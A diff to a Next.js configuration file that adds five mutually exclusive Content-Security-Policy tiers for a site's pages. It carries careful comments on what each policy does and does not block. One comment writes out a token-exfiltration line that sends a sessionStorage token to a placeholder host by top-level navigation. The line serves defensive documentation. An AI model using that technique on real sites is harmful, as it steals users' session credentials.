@@ -28,10 +28,22 @@
 // served as bytes, not rendered per request, and a header value here is a
 // constant. Hashes could, but the page is hand- and script-edited constantly,
 // and a stale hash does not degrade - it stops the widget dead in production.
-// So inline code is permitted and the policy buys what it still can: no script
-// may be LOADED from another origin, which is the realistic path for an
-// injected third-party tag, and connect-src keeps any script that does run from
-// posting the token anywhere but this origin.
+//
+// So inline code is permitted, and what the policy still buys has to be stated
+// accurately rather than generously. It buys one thing: no script may be LOADED
+// from another origin, which is the realistic path for an injected third-party
+// tag. It does NOT prevent exfiltration of the sessionStorage token. With
+// 'unsafe-inline', an injection that arrives as markup executes, reads the
+// token, and leaves by top-level navigation - `location = 'https://host/?t=' +
+// token`, a window.open, an <a> the script clicks. No enforceable directive
+// governs that: `navigate-to` was specified and never shipped, form-action
+// covers only form submissions, and connect-src covers only the programmatic
+// channels (fetch, XMLHttpRequest, WebSocket, EventSource, sendBeacon). So
+// connect-src 'self' narrows the exfiltration channels; it does not close them.
+// What makes a leaked token useless is server-side: the conversation is bound to
+// the HttpOnly session, the credential is single-use and rotates, and a reset
+// deletes and tombstones the record. The policy is defence in depth for the
+// window before those act, not a substitute for them.
 const HOMEPAGE_CSP = [
   // Nothing loads from anywhere but this origin unless a directive below says so.
   "default-src 'self'",
@@ -46,8 +58,10 @@ const HOMEPAGE_CSP = [
   "frame-src 'none'",
   // The only form is the NEXUS composer, which submits through fetch to this origin.
   "form-action 'self'",
-  // The chat proxy at /api/nexus/chat is same-origin, so no script that runs
-  // here can exfiltrate the sessionStorage token to another host.
+  // The chat proxy at /api/nexus/chat is same-origin, so a script that runs here
+  // cannot fetch, XHR, WebSocket, EventSource or sendBeacon the sessionStorage
+  // token to another host. It can still carry it out by navigating - see the
+  // note above; this directive governs programmatic requests only.
   "connect-src 'self'",
   // 'unsafe-inline' relaxation - see the note above. No wildcard: an injected
   // <script src> pointing off-origin is still refused.
@@ -113,6 +127,81 @@ const LEGACY_PAGE_CSP = [
   'upgrade-insecure-requests'
 ].join('; ');
 
+// Every other static page in public/ - and there are about twenty-five of them,
+// including /privacy-directive.html and /contact.html, which the assistant panel
+// itself links to.
+//
+// This tier exists because an enumerated list of paths was never coverage. The
+// conversation credential lives in sessionStorage, which is scoped to the ORIGIN
+// and the tab, not to a page: it survives a same-tab navigation, so a visitor who
+// chats and then clicks "Privacy" inside the panel carries a live token onto that
+// page, and an injection there could read it. Any page on this origin can read
+// the token, so every page needs the policy.
+//
+// The allowlist is the measured union of what those pages actually load, scanned
+// from their markup and from the local scripts they pull in - the same method the
+// legacy tier used, and pinned by a test that recomputes it. Enumerated hosts,
+// never a wildcard. Several of the entries exist only for leftover duplicate
+// pages (index.new.html, *-original.html, *-backup.html); deleting those pages
+// would let this list shrink.
+const STATIC_PAGE_CSP = [
+  "default-src 'self'",
+  "base-uri 'self'",
+  "object-src 'none'",
+  "frame-ancestors 'none'",
+  // Verified: not one <iframe>, <object> or <embed> in any of these pages.
+  "frame-src 'none'",
+  // No page has a cross-origin form action; formspree.io is the endpoint
+  // js/config.js names, and is allowed for the native POST as well as the fetch.
+  "form-action 'self' https://formspree.io",
+  // Iconify fetches its icon data over XHR from its own API hosts.
+  // js/lead-capture.js (contact.html, intake.html) posts to the gateway;
+  // js/nexus-chat.js and js/nexus-panel.js (index.new.html) reach the separate
+  // API host; js/config.js names the Formspree endpoint.
+  "connect-src 'self' https://api.iconify.design https://api.simplesvg.com https://api.unisvg.com https://api.barriosa2i.com https://barrios-api-gateway.onrender.com https://formspree.io",
+  // iconify almost everywhere, jsdelivr on index.new.html / intelligence-stack /
+  // status / nexus-personal-original, unpkg on order-success.
+  "script-src 'self' 'unsafe-inline' https://code.iconify.design https://cdn.jsdelivr.net https://unpkg.com",
+  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
+  "font-src 'self' https://fonts.gstatic.com",
+  // data: for inline SVG textures; the one remote image is index.new.html's
+  // noise.svg background.
+  "img-src 'self' data: https://grainy-gradients.vercel.app",
+  // neural-lattice-section.html is a leftover partial whose <source> still points
+  // at an old preview deployment. Enumerated rather than wildcarded, and it can
+  // only ever load media.
+  "media-src 'self' https://barrios-a2i-website-yvh6.vercel.app",
+  "worker-src 'self'",
+  "manifest-src 'self'",
+  'upgrade-insecure-requests'
+].join('; ');
+
+// The floor, for everything that is left: every Next.js route (/dashboard,
+// /sign-in, /mulligan/...), every API route, every build asset, and every path
+// that does not exist at all - a 404 is still a page on this origin.
+//
+// It deliberately carries no default-src, script-src, style-src or connect-src.
+// That is not an oversight and it must not be quietly "tightened" later without
+// a browser measurement. This half of the origin genuinely loads third-party
+// code that was never measured here: @clerk/nextjs hot-loads clerk.browser.js
+// from a Frontend API host that exists only in an environment variable and talks
+// to it over XHR, and public/checkout.html loads Stripe.js, which inserts its own
+// controller iframe and calls several stripe.com hosts. Shipping an unmeasured
+// default-src 'self' across the whole origin would break authentication and
+// checkout in production, which is a worse outcome than the residual it closes.
+//
+// What is here is every directive that cannot break a page which loads
+// third-party code, and each one is a real control: no injected <base> may
+// re-point the page's relative URLs, no plugin content may run, nothing may frame
+// this origin, and no injected form may POST off-origin.
+const BASELINE_CSP = [
+  "base-uri 'self'",
+  "object-src 'none'",
+  "frame-ancestors 'none'",
+  "form-action 'self' https://formspree.io",
+  'upgrade-insecure-requests'
+].join('; ');
+
 // A rewrite does not change which header rule matches: Next evaluates headers
 // against the incoming path. Both spellings are listed so the policy reaches the
 // page whether it is requested as /founder or as /founder.html.
@@ -126,6 +215,57 @@ const LEGACY_PAGE_PATHS = [
   '/command-center',
   '/command-center.html'
 ];
+
+const HOMEPAGE_PATHS = ['/', '/index.html'];
+
+// The one static page that loads Stripe.js. Stripe requires script-src, frame-src
+// and connect-src entries across several of its hosts and inserts a controller
+// iframe on load; none of that was measured in a browser here, and a partial
+// allowlist fails silently rather than loudly. So this page takes the floor, by
+// name, instead of a guessed policy on a payment page. Named as a residual: the
+// follow-up is to load it in Chrome, record the hosts it really uses, and move it
+// into the static tier.
+const FLOOR_ONLY_PAGE_PATHS = ['/checkout.html'];
+
+// PRECEDENCE. Next applies EVERY matching headers() entry, and two
+// Content-Security-Policy headers are enforced by browsers as their
+// INTERSECTION - so a second, apparently looser rule can silently kill a page.
+// Rather than depend on which of two matching rules is applied last (Next's dev
+// and start servers setHeader, so the last wins; Vercel's routing layer is a
+// different implementation), the five CSP sources below are written to be
+// MUTUALLY EXCLUSIVE. Exactly one matches any path, so order in headers() is
+// irrelevant to correctness and no page can ever receive two policies. A test
+// asserts that one-rule property path by path, and a served response is read off
+// the wire to confirm one header line.
+//
+// The two catch-alls use the same `:name(regex)` form the pre-existing CORS
+// carve-out uses.
+//
+// Every exclusion is anchored `/?$`, not `$`, and that detail is load-bearing.
+// Next compiles a header source with an optional trailing slash - the built
+// .next/routes-manifest.json shows `^/founder(?:/)?$` - so `/founder/` matches the
+// rule written `/founder`. With a bare `$` the catch-all's own exclusion missed
+// the slashed spelling, and `/founder/` picked up TWO Content-Security-Policy
+// headers, which a browser enforces as their intersection. Verified against Next's
+// own compiled regexes, not against a re-implementation of its matcher.
+const escapeLiteral = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+const notOneOf = (paths) =>
+  `(?!${paths.map((path) => `${escapeLiteral(path.replace(/^\//, ''))}/?$`).join('|')})`;
+
+// Every *.html path except the ones that carry their own policy above.
+const STATIC_PAGE_SOURCE = `/:page(${notOneOf([
+  ...HOMEPAGE_PATHS.filter((path) => path !== '/'),
+  ...LEGACY_PAGE_PATHS.filter((path) => path.endsWith('.html')),
+  ...FLOOR_ONLY_PAGE_PATHS
+])}.*\\.html)`;
+
+// Everything else: not any *.html (all of which are covered above), not the four
+// extensionless rewrite spellings, and not the root - `.+` rules out an empty
+// parameter and `(?!/?$)` rules out the `//` spelling of it, both of which the
+// homepage rule owns.
+const BASELINE_SOURCE = `/:path(${notOneOf(
+  LEGACY_PAGE_PATHS.filter((path) => !path.endsWith('.html'))
+)}(?!/?$)(?!.*\\.html/?$).+)`;
 
 /** @type {import('next').NextConfig} */
 const nextConfig = {
@@ -152,10 +292,13 @@ const nextConfig = {
   },
   async headers() {
     return [
-      // The homepage, under both the spellings Next serves it as. The sources
-      // here and in the legacy block below are mutually exclusive, so no request
-      // is ever matched by two policies.
-      ...['/', '/index.html'].map((source) => ({
+      // Five CSP tiers with mutually exclusive sources - see the PRECEDENCE note
+      // above. Exactly one of them matches any path on this origin, so no request
+      // is ever matched by two policies and the order of these entries does not
+      // affect which policy a page gets.
+      //
+      // The homepage, under both the spellings Next serves it as.
+      ...HOMEPAGE_PATHS.map((source) => ({
         source,
         headers: [{ key: 'Content-Security-Policy', value: HOMEPAGE_CSP }],
       })),
@@ -163,6 +306,18 @@ const nextConfig = {
         source,
         headers: [{ key: 'Content-Security-Policy', value: LEGACY_PAGE_CSP }],
       })),
+      ...FLOOR_ONLY_PAGE_PATHS.map((source) => ({
+        source,
+        headers: [{ key: 'Content-Security-Policy', value: BASELINE_CSP }],
+      })),
+      {
+        source: STATIC_PAGE_SOURCE,
+        headers: [{ key: 'Content-Security-Policy', value: STATIC_PAGE_CSP }],
+      },
+      {
+        source: BASELINE_SOURCE,
+        headers: [{ key: 'Content-Security-Policy', value: BASELINE_CSP }],
+      },
       {
         source: '/api/:path((?!nexus/).*)',
         headers: [
